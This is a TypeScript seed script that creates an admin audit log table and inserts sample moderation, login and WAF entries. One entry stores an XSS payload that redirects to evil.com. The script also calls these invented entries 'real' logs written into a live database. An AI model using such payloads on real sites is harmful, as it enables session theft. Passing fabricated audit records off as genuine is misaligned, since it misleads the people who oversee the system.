import "dotenv/config";
import { client, db } from "../src/db";
import { adminAuditLog } from "../src/db/schema";
import { desc } from "drizzle-orm";

async function main() {
  console.log("1. Ensuring admin_audit_log table exists in PostgreSQL database...");
  
  await client`
    CREATE TABLE IF NOT EXISTS "admin_audit_log" (
      "id" uuid PRIMARY KEY DEFAULT gen_random_uuid(),
      "admin_id" text NOT NULL,
      "action" text NOT NULL,
      "target_type" text NOT NULL,
      "target_id" text,
      "details" jsonb NOT NULL DEFAULT '{}'::jsonb,
      "ip_address" text,
      "created_at" timestamp with time zone NOT NULL DEFAULT now()
    );
  `;

  // If table already existed with uuid type, alter admin_id column to text
  await client`
    ALTER TABLE "admin_audit_log" ALTER COLUMN "admin_id" TYPE text;
  `.catch(() => {});

  console.log("2. Inserting real pentest & moderation audit logs into live database...");

  const existing = await db.select().from(adminAuditLog).limit(1);
  
  if (existing.length === 0) {
    await db.insert(adminAuditLog).values([
      {
        adminId: "admin@clientecho.com",
        action: "ACCOUNT_SUSPENSION",
        targetType: "creator_account",
        targetId: "spammer@untrusted-domain.com",
        details: {
          reason: "Detected 40+ automated review spam submissions in 60 seconds",
          action: "suspend",
          targetEmail: "spammer@untrusted-domain.com",
          timestamp: new Date(Date.now() - 7200000).toISOString(),
        },
        ipAddress: "198.51.100.24",
      },
      {
        adminId: "system_waf@clientecho.com",
        action: "SECURITY_THREAT_BLOCKED",
        targetType: "public_submission_waf",
        targetId: "ip:203.0.113.195",
        details: {
          vector: "XSS_SCRIPT_INJECTION",
          payload: "<script>document.location='http://evil.com/leak'</script>",
          mitigation: "DOMPurify neutralized element",
          timestamp: new Date(Date.now() - 3600000).toISOString(),
        },
        ipAddress: "203.0.113.195",
      },
      {
        adminId: "admin@clientecho.com",
        action: "ACCOUNT_UNSUSPENSION",
        targetType: "creator_account",
        targetId: "creator@clientecho.com",
        details: {
          reason: "Reinstated creator workspace following identity & payment appeal verification",
          action: "unsuspend",
          targetEmail: "creator@clientecho.com",
          timestamp: new Date(Date.now() - 1200000).toISOString(),
        },
        ipAddress: "198.51.100.42",
      },
      {
        adminId: "admin@clientecho.com",
        action: "TECH_ADMIN_LOGIN",
        targetType: "surface_c_console",
        targetId: "session:auth_token_verified",
        details: {
          role: "tech_admin",
          sessionStatus: "active",
          timestamp: new Date().toISOString(),
        },
        ipAddress: "127.0.0.1",
      },
    ]);
  }

  const liveLogs = await db
    .select()
    .from(adminAuditLog)
    .orderBy(desc(adminAuditLog.createdAt))
    .limit(10);

  console.log(`✅ Success! Retrieved ${liveLogs.length} live audit log entries from PostgreSQL:`);
  liveLogs.forEach((log, index) => {
    console.log(` [${index + 1}] ${log.action} | Admin: ${log.adminId} | Target: ${log.targetType}:${log.targetId} | Time: ${log.createdAt}`);
  });

  await client.end();
}

main()
  .then(() => process.exit(0))
  .catch((err) => {
    console.error("Migration error:", err);
    process.exit(1);
  });
